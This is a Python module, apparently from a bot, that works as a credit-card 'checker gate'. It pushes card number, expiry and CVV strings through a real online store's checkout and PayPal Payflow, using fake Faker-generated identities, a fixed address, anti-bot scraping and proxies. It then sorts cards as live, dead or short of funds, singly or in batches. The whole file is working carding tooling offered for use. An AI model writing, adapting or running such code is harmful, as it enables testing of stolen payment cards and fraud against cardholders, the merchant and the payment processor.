"""Gate Hiperion Payflow - Verificación de tarjetas a través de Nigel B Design + PayPal Payflow"""
import asyncio
import json
import logging
import random
import re
import time
from datetime import datetime
from pathlib import Path
from typing import Callable, Dict, List, Optional, Tuple
import cloudscraper
from faker import Faker

from bot.config import gate_proxy

logger = logging.getLogger(__name__)

def _debug_save_receipt(step: str, status_code: int, body: str) -> None:
    """Guarda el recibo de Payflow redactado (sin PAN) para diagnóstico."""
    try:
        debug_dir = Path("data/hiperion_debug")
        debug_dir.mkdir(parents=True, exist_ok=True)
        redacted = re.sub(r"\d{12,19}", "[PAN]", body)
        content = f"STEP: {step}\nSTATUS: {status_code}\n--- BODY ---\n{redacted[:20000]}\n"
        (debug_dir / f"{step}_{int(time.time())}.txt").write_text(content, encoding="utf-8")
    except Exception:
        pass

def _pick_proxy() -> Optional[dict]:
    """Proxy sticky MX con lifetime (fallback rotatorio) para el flujo."""
    proxy_url = gate_proxy("mx") or gate_proxy("rot")
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}

def parse(text: str, a: str, b: str) -> str: 
    """Función auxiliar para extraer texto entre dos delimitadores."""
    return text.split(a)[1].split(b)[0]

def parseX(data, start, end):
    """Función auxiliar para extraer texto entre dos delimitadores."""
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def procesar_y_validar(card: str) -> Optional[Tuple[str, str, str, str]]:
    """Valida y procesa el formato de la tarjeta."""
    def es_fecha_anterior(mes, ano):
        fecha_actual = datetime.now().strftime('%Y-%m')
        fecha_proporcionada = f"{'20'+ano}-{mes:02}"
        return fecha_proporcionada >= fecha_actual
    
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")    
    
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card)
    if not match:
        return None    
    
    values = card.split("|")
    if len(values) < 4:
        return None    
    
    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]    
    
    if not es_fecha_anterior(mes, ano):
        return None    
    
    return cc_number, mes, ano, cvv

async def hiperion_check(card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    """Verifica una sola tarjeta contra Hiperion Payflow."""
    logger.info(f"Hiperion gate: inicio check user_id={user_id}")
    
    loop = asyncio.get_event_loop()
    
    def _run() -> Dict[str, str]:
        try:
            resultado = procesar_y_validar(card_data)    
            if resultado is None:
                return {
                    "status": "❌ Dead", 
                    "message": "Fechas Invalidas", 
                    "time": "0.00"
                }
            else:
                cc_number, mes, ano, cvv = resultado  

            faker = Faker()  
            nombre = faker.first_name()
            apellido = faker.last_name()
            email = f'{nombre}{apellido}.{cc_number[6:12]}@icloud.com'
            zip_code = faker.zipcode()
            street = faker.address()
            city = faker.city()
            state_abbr = faker.state_abbr()
            phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])

            inicio = datetime.now()
            
            # Crear sesión con proxy
            seccion = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, 
                delay=2
            )
            
            # Aplicar proxy si está configurado
            proxy = _pick_proxy()
            if proxy:
                seccion.proxies = proxy

            # --- Paso 1: Acceder al producto ---
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }

            r1 = seccion.get(
                'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
                headers=headers,
            )

            # --- Paso 2: Agregar al carrito ---
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://nigelbdesign.com',
                'priority': 'u=1, i',
                'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            json_data = {
                'items': [
                    {
                        'ItemID': 1062,
                        'Quantity': '0',
                        'CategoryID': 1021,
                        'Inventory': None,
                        'ItemNumber': 'NB-CIS',
                        'OrderType': 1,
                    },
                ],
                'componentID': '1070',
                'type': '1',
                'addedFromPage': 'ItemDetail',
            }
            
            r2 = seccion.post('https://nigelbdesign.com/addtocart', headers=headers, json=json_data)
            
            # Verificar si hay error en la respuesta
            if '"ErrorMessage"' in r2.text:
                error_msg = parseX(r2.text, '"ErrorMessage":"', '"')
                if error_msg:
                    tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
                    return {
                        "status": "⚠️ Error",
                        "message": f"Error en carrito: {error_msg}",
                        "time": tiempo
                    }

            # Extraer token y record ID
            token_match = re.search(r'Token=([^"&]+)', r2.text)
            num_match = re.search(r'recordids=([^"&\\]+)', r2.text)
            
            if not token_match or not num_match:
                tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
                return {
                    "status": "⚠️ Error",
                    "message": "No se pudieron obtener credenciales del carrito",
                    "time": tiempo
                }
                
            token = token_match.group(1)
            num = num_match.group(1)

            # --- Paso 3: Ir al carrito ---
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            params = {
                'token': token,
                'recordids': num,
            }
            
            r3 = seccion.get('https://nigelbdesign.com/addtocart', params=params, headers=headers)

            # --- Paso 4: Proceder al checkout ---
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-419,es;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://cart.thomasnet-navigator.com',
                'priority': 'u=1, i',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }
            
            json_data = {
                'actionmode': 'proceedtocheckout',
                'items': [
                    {
                        'ItemID': 1062,
                        'PreviousQuantity': 1,
                        'Quantity': '1',
                        'OrderID': 1334,
                        'RecordID': 1409,
                        'MinOrderQty': 1,
                        'ItemNumber': 'NB-CIS',
                        'OrderType': 'Order',
                    },
                ],
                'shipping': {
                    'TaxExempt': '',
                },
            }
            
            r4 = seccion.post(
                'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
                params=params,
                headers=headers,
                json=json_data,
            )

            # --- Paso 5: Ir a shipping/billing ---
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'priority': 'u=0, i',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }
            
            r5 = seccion.get(
                'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
                params=params,
                headers=headers,
            )

            # --- Paso 6: Estimar envío (igual que el flujo de referencia) ---
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://cart.thomasnet-navigator.com',
                'priority': 'u=1, i',
                'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }

            json_data = {
                'actionmode': 'step1estimate',
                'items': None,
                'shipping': {
                    'Addresses': [
                        {
                            'AddressType': '2',
                            'FirstName': nombre,
                            'LastName': apellido,
                            'CompanyName': '',
                            'Address1': '2018 Meadowview Drive',
                            'Address2': '',
                            'Address3': '',
                            'City': 'Ridgeway',
                            'StateShortName': 'MO',
                            'Region': '',
                            'State/Province_-_Shipping': '',
                            'CountryShortName': 'US',
                            'Zip': '64481',
                            'Phone': phone,
                            'Fax': '',
                            'Email': '',
                            'AddressNumber': '',
                        },
                    ],
                    'FreightOptions': [],
                    'IsCheckout': True,
                },
            }

            r6 = seccion.post(
                'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
                params=params,
                headers=headers,
                json=json_data,
            )

            # --- Paso 6: Estimar envío ---
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://cart.thomasnet-navigator.com',
                'priority': 'u=1, i',
                'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
                'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }
            
            json_data = {
                'actionmode': 'step1estimate',
                'items': None,
                'shipping': {
                    'Addresses': [
                        {
                            'AddressType': '2',
                            'FirstName': nombre,
                            'LastName': apellido,
                            'CompanyName': '',
                            'Address1': '2018 Meadowview Drive',
                            'Address2': '',
                            'Address3': '',
                            'City': 'Ridgeway',
                            'StateShortName': 'MO',
                            'Region': '',
                            'State/Province_-_Shipping': '',
                            'CountryShortName': 'US',
                            'Zip': '64481',
                            'Phone': phone,
                            'Fax': '',
                            'Email': '',
                            'AddressNumber': '',
                        },
                    ],
                    'FreightOptions': [],
                    'IsCheckout': True,
                },
            }
            
            r6 = seccion.post(
                'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
                params=params,
                headers=headers,
                json=json_data,
            )

            # --- Paso 7: Guardar información de envío ---
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://cart.thomasnet-navigator.com',
                'priority': 'u=1, i',
                'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
                'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }
            
            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }
            
            json_data = {
                'actionmode': 'save',
                'shipping': {
                    'Addresses': [
                        {
                            'AddressType': '2',
                            'FirstName': nombre,
                            'LastName': apellido,
                            'CompanyName': '',
                            'Address1': '2018%20Meadowview%20Drive',
                            'Address2': '',
                            'Address3': '',
                            'City': 'Ridgeway',
                            'StateShortName': 'MO',
                            'Region': '',
                            'State/Province_-_Shipping': '',
                            'CountryShortName': 'US',
                            'Zip': '64481',
                            'Phone': phone,
                            'Fax': '',
                            'Email': email,
                            'AddressNumber': '',
                        },
                    ],
                    'FreightShippings': [],
                    'GeneralShippings': [],
                    'IsInternational': False,
                    'IsCheckout': True,
                    'IsFreight': False,
                    'ErrorMessage': '',
                    'FreightOptions': [],
                    'TaxExempt': None,
                    'ShippingTotal': None,
                    'HandlingTotal': None,
                    'TaxTotal': 0,
                    'Total': None,
                    'GeneralShippingKey': '128-Actual-41.71-0-4-0-0',
                    'IsOnlyFreightServices': False,
                    'ShippingAccountNumber': '',
                    'IsValidAddress': True,
                },
                'isSaveAddress': False,
            }
            
            r7 = seccion.post(
                'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
                params=params,
                headers=headers,
                json=json_data,
            )

            # --- Paso 8: Ir a opciones de pago ---
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-419,es;q=0.9',
                'priority': 'u=0, i',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            params = {
                'token': token,
                'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            }
            
            r8 = seccion.get(
                'https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',
                params=params,
                headers=headers,
            )
            
            # Extraer credenciales de PayPal
            securetokenid_match = re.search(r'paypal.com/\?SecureTokenID=([^&"]+)', r8.text)
            securetoken_match = re.search(r'SecureToken=([^"]+)', r8.text)
            
            if not securetokenid_match or not securetoken_match:
                tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
                return {
                    "status": "⚠️ Error",
                    "message": "No se pudieron obtener credenciales de PayPal",
                    "time": tiempo
                }
                
            securetokenid = securetokenid_match.group(1)
            securetoken = securetoken_match.group(1)

            # --- Paso 9: Ir a Payflow Link ---
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-419,es;q=0.9',
                'Connection': 'keep-alive',
                'Referer': 'https://cart.thomasnet-navigator.com/',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            params = {
                'SecureTokenID': securetokenid,
                'SecureToken': securetoken,
            }
            
            r9 = seccion.get('https://payflowlink.paypal.com/', params=params, headers=headers)
            
            # Extraer CSRF token
            csrf_match = re.search(r'name="CSRF_TOKEN" type="hidden" value="([^"]+)"', r9.text)
            if not csrf_match:
                tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
                return {
                    "status": "⚠️ Error",
                    "message": "No se pudo obtener token CSRF",
                    "time": tiempo
                }
                
            csrf = csrf_match.group(1)

            # --- Paso 10: Enviar datos de tarjeta al procesador ---
            # Va a processTransaction.do con los campos Payflow completos.
            # Publicar al layout "/" con campos inventados hace que PayPal
            # responda "Invalid Merchant" aunque el comercio esté sano.
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://payflowlink.paypal.com',
                'referer': f'https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            }

            data = [
                ('subaction', ''),
                ('CARDNUM', cc_number),
                ('EXPMONTH', mes),
                ('EXPYEAR', ano),
                ('startdate_month', ''),
                ('startdate_year', ''),
                ('issue_number', ''),
                ('METHOD', 'C'),
                ('PAYMETHOD', 'C'),
                ('FIRST_NAME', nombre),
                ('LAST_NAME', apellido),
                ('template', ''),
                ('ADDRESS', '2018+Meadowview+Drive++'),
                ('CITY', 'Ridgeway'),
                ('STATE', 'MO'),
                ('ZIP', '64481'),
                ('COUNTRY', 'US'),
                ('PHONE', ''),
                ('EMAIL', ''),
                ('SHIPPING_FIRST_NAME', nombre),
                ('SHIPPING_LAST_NAME', apellido),
                ('ADDRESSTOSHIP', '2018+Meadowview+Drive++'),
                ('CITYTOSHIP', 'Ridgeway'),
                ('STATETOSHIP', 'MO'),
                ('ZIPTOSHIP', '64481'),
                ('COUNTRYTOSHIP', 'US'),
                ('PHONETOSHIP', ''),
                ('EMAILTOSHIP', ''),
                ('TYPE', 'A'),
                ('SHIPAMOUNT', '0.00'),
                ('TAX', '0.00'),
                ('VERBOSITY', 'HIGH'),
                ('flag3dSecure', ''),
                ('CURRENCY', 'USD'),
                ('swipeData', '0'),
                ('SECURETOKEN', securetoken),
                ('SECURETOKENID', securetokenid),
                ('PARMLIST', ''),
                ('MODE', ''),
                ('CSRF_TOKEN', csrf),
                ('referringTemplate', 'minlayout'),
            ]
            r10 = seccion.post(
                'https://payflowlink.paypal.com/processTransaction.do',
                headers=headers,
                data=data,
            )

            tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
            source = r10.text
            _debug_save_receipt("s10_receipt", r10.status_code, source)

            # El veredicto se lee del recibo, nunca del HTTP: PayPal
            # responde 200 hasta cuando rechaza.
            respmsg = parseX(source, 'name="RESPMSG" value="', '"/>')
            avsdata = parseX(source, 'name="AVSDATA" value="', '"/>')
            detail = f"{respmsg} | AVS: {avsdata}" if respmsg else "Sin detalle del procesador."

            if 'Approved' in source:
                return {
                    "status": "✅ Live",
                    "message": "Tarjeta aprobada (verificación 1 USD).",
                    "time": tiempo
                }
            if 'Insufficient funds available' in source:
                return {
                    "status": "💸 Fondos Insuficientes",
                    "message": detail,
                    "time": tiempo
                }
            if 'RESPMSG' in source:
                return {
                    "status": "❌ Dead",
                    "message": detail,
                    "time": tiempo
                }
            return {
                "status": "⚠️ Error",
                "message": "El comercio no devolvió veredicto. Avisa a un admin.",
                "time": tiempo
            }

        except Exception as e:
            tiempo = f'{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return {
                "status": "⚠️ Error",
                "message": str(e),
                "time": tiempo
            }

    return await loop.run_in_executor(None, _run)


async def hiperion_check_multiple(
    cards: List[str],
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
    user_id: Optional[int] = None,
) -> List[Dict[str, str]]:
    """Verifica un lote de tarjetas en secuencia, con callback por tarjeta."""
    clean = [c.strip() for c in cards if c.strip()][:10]
    results: List[Dict[str, str]] = []
    for i, card in enumerate(clean):
        result = await hiperion_check(card, user_id)
        results.append(result)
        if callback:
            try:
                await callback(i, result, card, user_id or 0)
            except Exception:
                logger.exception("Error en callback de Hiperion mass")
        if i < len(clean) - 1:
            await asyncio.sleep(5)
    return results
         